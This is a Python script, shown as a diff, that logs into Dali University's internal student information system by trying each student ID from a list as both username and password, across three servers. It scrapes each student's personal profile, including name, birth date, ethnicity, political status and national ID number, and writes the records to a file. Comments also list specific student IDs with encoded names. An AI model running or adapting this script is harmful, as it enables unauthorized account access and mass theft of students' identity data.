@@ -1,0 +1,183 @@
+import requests
+import re
+import json
+import time
+import urllib.request
+from multiprocessing.pool import Pool
+s=requests.Session()
+password1=[]
+with open('大理大学学生学号.txt','r',encoding='utf-8')as f:
+    a=f.read()
+password1.append(a)
+item={}
+passwords=password1[0].replace('\n',',').split(',')
+def deep_crawl(password):
+    try:
+        headers = {
+             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'}
+        payload = {'__VIEWSTATE': '',
+                    'TextBox1': '',
+                    'TextBox2': '',
+                    'RadioButtonList1': '(unable to decode value)',
+                    'Button1': '',
+                    'lbLanguage': ''}
+
+        payload['TextBox1'] = password
+        payload['TextBox2'] = password
+        html = requests.get('http://192.168.100.81/(eml1qi55o0er4z45p3r1ns55)/default2.aspx', headers=headers).text
+        value1 = re.compile('input type="hidden" name="__VIEWSTATE" value="(.*?)" />').findall(html)[0]
+        payload['__VIEWSTATE'] = value1
+        first_login = s.post(url='http://192.168.100.81/(eml1qi55o0er4z45p3r1ns55)/default2.aspx', data=payload,headers=headers).text
+        try:
+            name = re.compile('href="bmxmb.aspx?.*?xm=(.*?)&gnmkdm=N121303"').findall(first_login)[0]
+        except Exception as e:
+            print(e)
+
+        referer='http://192.168.100.81/(eml1qi55o0er4z45p3r1ns55)/xs_main.aspx?xh='+password
+        headers2={'Referer': referer,'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'}
+            #2017108102 http://192.168.100.81/(eml1qi55o0er4z45p3r1ns55)/xsgrxx.aspx?xh=2017108102&xm=%CC%C6%D3%C0%BB%B6&gnmkdm=N121501
+            #2017108142 http://192.168.100.84/(0aq1gx45f1xw5g2dewdjvonc)/xsgrxx.aspx?xh=2017108142&xm=%CD%F5%F6%CE&gnmkdm=N121501
+            #2015101133 http://192.168.100.84/(0aq1gx45f1xw5g2dewdjvonc)/xsgrxx.aspx?xh=2015101133&xm=%D5%C5%EA%D8&gnmkdm=N121501
+            #2015101102 http://192.168.100.84/(0aq1gx45f1xw5g2dewdjvonc)/xsgrxx.aspx?xh=2015101102&xm=%C1%D6%C8%F1&gnmkdm=N121501
+            #2015101232 http://192.168.100.84/(0aq1gx45f1xw5g2dewdjvonc)/xsgrxx.aspx?xh=2015101232&xm=%B6%AD%B1%A6%C8%E5&gnmkdm=N121501
+        url2='http://192.168.100.81/(eml1qi55o0er4z45p3r1ns55)/xsgrxx.aspx?xh='+password+'&xm='+urllib.request.quote(name,encoding='gbk'and'utf-8')+'&gnmkdm=N121501'
+        response=s.get(url=url2,headers=headers2).text
+        if len(response)>20000:
+                    item["学号"]=re.compile('<TD><span id="xh">(.*?)</span></TD>').findall(response)[0]
+                    item["姓名"]=re.compile('<TD><span id="xm">(.*?)</span></TD>').findall(response)[0]
+                    item["性别"]=re.compile('<TD><span id="lbl_xb">(.*?)</span></TD>').findall(response)[0]
+                    item["出生日期"]=re.compile('<TD><span id="lbl_csrq">(.*?)</span></TD>').findall(response)[0]
+                    item["民族"]=re.compile('<TD><span id="lbl_mz">(.*?)</span></TD>').findall(response)[0]
+                    item["政治面貌"]=re.compile('<TD height="7"><span id="lbl_zzmm">(.*?)</span></TD>').findall(response)[0]
+                    item["来源省"]=re.compile('<td><span id="lbl_lys">(.*?)</span></td>').findall(response)[0]
+                    item["身份证号"]=re.compile('<TD colSpan="2"><span id="lbl_sfzh">(.*?)</span></TD>').findall(response)[0]
+                    item["学历层次"]=re.compile('<TD colSpan="2"><span id="lbl_CC">(.*?)</span></TD>').findall(response)[0]
+                    item["学院"]=re.compile('<TD><span id="lbl_xy">(.*?)</span></TD>').findall(response)[0]
+                    item["专业名称"]=re.compile('<TD><span id="lbl_zymc">(.*?)</span></TD>').findall(response)[0]
+                    item["行政班"]=re.compile('<TD><span id="lbl_xzb">(.*?)</span></TD>').findall(response)[0]
+                    item["学制"]=re.compile('<TD><span id="lbl_xz">(.*?)</span></TD>').findall(response)[0]
+                    print(item)
+                    js = json.dumps(item,ensure_ascii=False)
+                    with open('大理大学校园数据安全分析.txt','a',encoding='gb18030',errors='ignore')as f:
+                        f.write(js + '\n')
+
+        else:
+            extra_API(password)
+    except Exception as e:
+        print(e)
+def extra_API(password):
+    try:
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'}
+        payload = {'__VIEWSTATE': '',
+                    'TextBox1': '',
+                    'TextBox2': '',
+                    'RadioButtonList1': '(unable to decode value)',
+                    'Button1': '',
+                    'lbLanguage': ''}
+
+        payload['TextBox1'] = password
+        payload['TextBox2'] = password
+        html = requests.get('http://192.168.100.81/(eml1qi55o0er4z45p3r1ns55)/default2.aspx', headers=headers).text
+        value1 = re.compile('input type="hidden" name="__VIEWSTATE" value="(.*?)" />').findall(html)[0]
+        payload['__VIEWSTATE'] = value1
+        first_login = s.post(url='http://192.168.100.81/(eml1qi55o0er4z45p3r1ns55)/default2.aspx', data=payload,
+                                    headers=headers).text
+        try:
+            name = re.compile('href="bmxmb.aspx?.*?xm=(.*?)&gnmkdm=N121303"').findall(first_login)[0]
+        except Exception:
+            pass
+        referer = 'http://192.168.100.84/(0aq1gx45f1xw5g2dewdjvonc)/xs_main.aspx?xh=' +password
+        headers2 = {'Referer': referer,
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'}
+            # 2015101232 http://192.168.100.84/(0aq1gx45f1xw5g2dewdjvonc)/xsgrxx.aspx?xh=2015101232&xm=%B6%AD%B1%A6%C8%E5&gnmkdm=N121501
+        url2 = 'http://192.168.100.84/(0aq1gx45f1xw5g2dewdjvonc)/xsgrxx.aspx?xh=' + password + '&xm=' + urllib.request.quote(name, encoding='gbk'and'utf-8') + '&gnmkdm=N121501'
+        response = s.get(url=url2, headers=headers2).text
+        if len(response) > 20000:
+            item["学号"] = re.compile('<TD><span id="xh">(.*?)</span></TD>').findall(response)[0]
+            item["姓名"] = re.compile('<TD><span id="xm">(.*?)</span></TD>').findall(response)[0]
+            item["性别"] = re.compile('<TD><span id="lbl_xb">(.*?)</span></TD>').findall(response)[0]
+            item["出生日期"] = re.compile('<TD><span id="lbl_csrq">(.*?)</span></TD>').findall(response)[0]
+            item["民族"] = re.compile('<TD><span id="lbl_mz">(.*?)</span></TD>').findall(response)[0]
+            item["政治面貌"] = re.compile('<TD height="7"><span id="lbl_zzmm">(.*?)</span></TD>').findall(response)[0]
+            item["来源省"] = re.compile('<td><span id="lbl_lys">(.*?)</span></td>').findall(response)[0]
+            item["身份证号"] = re.compile('<TD colSpan="2"><span id="lbl_sfzh">(.*?)</span></TD>').findall(response)[0]
+            item["学历层次"] = re.compile('<TD colSpan="2"><span id="lbl_CC">(.*?)</span></TD>').findall(response)[0]
+            item["学院"] = re.compile('<TD><span id="lbl_xy">(.*?)</span></TD>').findall(response)[0]
+            item["专业名称"] = re.compile('<TD><span id="lbl_zymc">(.*?)</span></TD>').findall(response)[0]
+            item["行政班"] = re.compile('<TD><span id="lbl_xzb">(.*?)</span></TD>').findall(response)[0]
+            item["学制"] = re.compile('<TD><span id="lbl_xz">(.*?)</span></TD>').findall(response)[0]
+            print(item)
+            js = json.dumps(item, ensure_ascii=False)
+            with open('大理大学校园数据安全分析.txt', 'a', encoding='gb18030',errors='ignore')as f:
+                f.write(js + '\n')
+        else:
+            thriAPI(password)
+    except Exception as e:
+        print(e)
+def thriAPI(password):
+    try:
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'}
+        payload = {'__VIEWSTATE': '',
+                    'TextBox1': '',
+                    'TextBox2': '',
+                    'RadioButtonList1': '(unable to decode value)',
+                    'Button1': '',
+                    'lbLanguage': ''}
+
+        payload['TextBox1'] = password
+        payload['TextBox2'] = password
+        html = requests.get('http://192.168.100.77/(lwtt0pfpyv5mm2fxgvbaah45)/default2.aspx', headers=headers).text
+        value1 = re.compile('input type="hidden" name="__VIEWSTATE" value="(.*?)" />').findall(html)[0]
+        payload['__VIEWSTATE'] = value1
+        first_login = s.post(url='http://192.168.100.77/(lwtt0pfpyv5mm2fxgvbaah45)/default2.aspx', data=payload,
+                                    headers=headers).text
+        try:
+            name = re.compile('href="bmxmb.aspx?.*?xm=(.*?)&gnmkdm=N121303"').findall(first_login)[0]
+        except Exception:
+            pass
+        referer = 'http://192.168.100.77/(lwtt0pfpyv5mm2fxgvbaah45)/xs_main.aspx?xh=' +password
+        headers2 = {'Referer': referer,
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'}
+        # 2015101232 http://192.168.100.84/(0aq1gx45f1xw5g2dewdjvonc)/xsgrxx.aspx?xh=2015101232&xm=%B6%AD%B1%A6%C8%E5&gnmkdm=N121501
+        url2 = 'http://192.168.100.77/(lwtt0pfpyv5mm2fxgvbaah45)/xsgrxx.aspx?xh=' + password + '&xm=' + urllib.request.quote(name, encoding='gbk'and'utf-8') + '&gnmkdm=N121501'
+        response = s.get(url=url2, headers=headers2).text
+        if len(response) > 20000:
+            item["学号"] = re.compile('<TD><span id="xh">(.*?)</span></TD>').findall(response)[0]
+            item["姓名"] = re.compile('<TD><span id="xm">(.*?)</span></TD>').findall(response)[0]
+            item["性别"] = re.compile('<TD><span id="lbl_xb">(.*?)</span></TD>').findall(response)[0]
+            item["出生日期"] = re.compile('<TD><span id="lbl_csrq">(.*?)</span></TD>').findall(response)[0]
+            item["民族"] = re.compile('<TD><span id="lbl_mz">(.*?)</span></TD>').findall(response)[0]
+            item["政治面貌"] = re.compile('<TD height="7"><span id="lbl_zzmm">(.*?)</span></TD>').findall(response)[0]
+            item["来源省"] = re.compile('<td><span id="lbl_lys">(.*?)</span></td>').findall(response)[0]
+            item["身份证号"] = re.compile('<TD colSpan="2"><span id="lbl_sfzh">(.*?)</span></TD>').findall(response)[0]
+            item["学历层次"] = re.compile('<TD colSpan="2"><span id="lbl_CC">(.*?)</span></TD>').findall(response)[0]
+            item["学院"] = re.compile('<TD><span id="lbl_xy">(.*?)</span></TD>').findall(response)[0]
+            item["专业名称"] = re.compile('<TD><span id="lbl_zymc">(.*?)</span></TD>').findall(response)[0]
+            item["行政班"] = re.compile('<TD><span id="lbl_xzb">(.*?)</span></TD>').findall(response)[0]
+            item["学制"] = re.compile('<TD><span id="lbl_xz">(.*?)</span></TD>').findall(response)[0]
+            print(item)
+            js = json.dumps(item, ensure_ascii=False)
+            with open('大理大学校园数据安全分析.txt', 'a', encoding='gb18030',errors='ignore')as f:
+                f.write(js+'\n')
+        else:
+            pass
+    except Exception as e:
+        print(e)
+if __name__=='__main__':
+    '''pool=Pool()
+    groups=(password for password in passwords)
+    pool.map(deep_crawl,groups)
+    pool.close()
+    pool.join()'''
+    for password in passwords:
+        deep_crawl(password)
+
+
+
+
+
+
+
+
